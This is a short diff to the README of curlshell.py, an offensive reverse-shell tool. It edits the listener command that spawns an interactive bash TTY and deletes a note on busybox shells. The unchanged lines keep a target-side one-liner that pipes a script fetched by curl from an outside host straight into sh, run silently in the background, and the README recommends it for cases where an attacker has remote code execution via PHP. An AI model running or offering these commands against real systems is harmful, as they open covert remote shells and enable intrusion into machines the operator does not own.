@@ -51,16 +51,10 @@ curl -sfL http://1.2.3.4:8080 | sh
 Spawn a TTY shell
 ```sh
 stty intr undef ;
-./curlshell.py --shell 'script -qc /bin/bash /dev/null' --listen-port 8080 ; stty intr ^C
+./curlshell.py --shell "script -qc '/bin/bash -il' /dev/null" --listen-port 8080 ; stty intr ^C
 ```
 
 Start the reverse shell as a daemon / background process. This is useful when you have remote execution via PHP:
-```sh
-# Dont use 'sh -il' in busybox [ash: alpine, docker] which will fail with SIGTTIN.
-# Instead use just 'sh'
-./curlshell.py --shell sh --listen-port 8080
-```
-
 ```sh
 # On the target:
 (curl -sfL http://1.2.3.4:8080 | sh &>/dev/null &)
